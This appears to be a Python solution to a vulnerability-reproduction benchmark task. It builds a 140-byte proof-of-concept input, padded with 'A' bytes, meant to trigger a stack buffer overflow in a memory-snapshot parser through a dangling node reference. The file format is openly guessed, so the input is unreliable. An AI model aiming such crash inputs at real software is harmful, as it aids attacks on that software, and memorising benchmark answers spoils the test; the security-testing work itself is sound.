import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to examine the source code
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall(path='./src_extracted')
        
        # Look for the vulnerable function in the source code
        # Based on the description, we need to create a PoC that triggers
        # a stack buffer overflow when parsing memory snapshots
        # The vulnerability is in node_id_map lookup
        
        # We'll create a binary payload that:
        # 1. Has a node reference to a non-existent node ID
        # 2. Triggers the buffer overflow when the invalid iterator is dereferenced
        
        # From typical memory snapshot formats, we assume:
        # - Header with magic number and version
        # - Node count
        # - Node data
        # - References between nodes
        
        # Build the PoC to be exactly 140 bytes (ground-truth length)
        poc = bytearray()
        
        # Add magic header (assume 4 bytes)
        poc.extend(b'MEM\x00')  # Magic
        
        # Version (1 byte)
        poc.append(1)
        
        # Node count (4 bytes) - make it 0 to have no valid nodes
        poc.extend(struct.pack('<I', 0))
        
        # But we need to reference a non-existent node
        # Add a reference section that points to node 1 (which doesn't exist)
        # Reference count (4 bytes)
        poc.extend(struct.pack('<I', 1))
        
        # Reference from node 0 to node 1 (8 bytes: 4 + 4)
        poc.extend(struct.pack('<II', 0, 1))
        
        # The vulnerability description says "stack buffer overflow"
        # This suggests the code might have a fixed-size buffer on stack
        # that gets overflowed when processing the invalid reference
        # We'll add padding to reach 140 bytes and potentially overflow
        
        # Calculate current size
        current_size = len(poc)
        
        # Fill the rest with 'A's to potentially overflow a buffer
        # when the invalid iterator is dereferenced and data is copied
        padding_size = 140 - current_size
        if padding_size > 0:
            poc.extend(b'A' * padding_size)
        
        # Verify size is exactly 140 bytes
        assert len(poc) == 140, f"PoC length is {len(poc)}, expected 140"
        
        return bytes(poc)
